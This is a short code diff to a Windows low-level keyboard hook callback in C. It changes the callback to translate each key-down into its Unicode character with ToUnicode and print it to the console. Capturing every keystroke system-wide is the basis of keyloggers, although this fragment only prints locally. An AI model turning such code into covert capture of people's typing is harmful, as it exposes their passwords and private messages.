@@ -9,9 +9,27 @@ LRESULT CALLBACK hook_proc(
 {
     if(code >= 0)
     {
-        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
-        char key = (char)MapVirtualKeyA(kb->vkCode, MAPVK_VK_TO_CHAR);
-        printf("%c\n", key);
+        if (wParam == WM_KEYDOWN){
+            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
+            BYTE keyboardState[256];
+            GetKeyboardState(keyboardState);
+
+            WCHAR buffer[5];
+
+            int res = ToUnicode(
+                kb->vkCode,
+                kb->scanCode,
+                keyboardState,
+                buffer,
+                4,
+                0
+            );
+
+            if(res > 0){
+                printf("%lc \n", buffer[0]);
+            }
+        }
+
     }
 
     return CallNextHookEx(NULL, code, wParam, lParam);
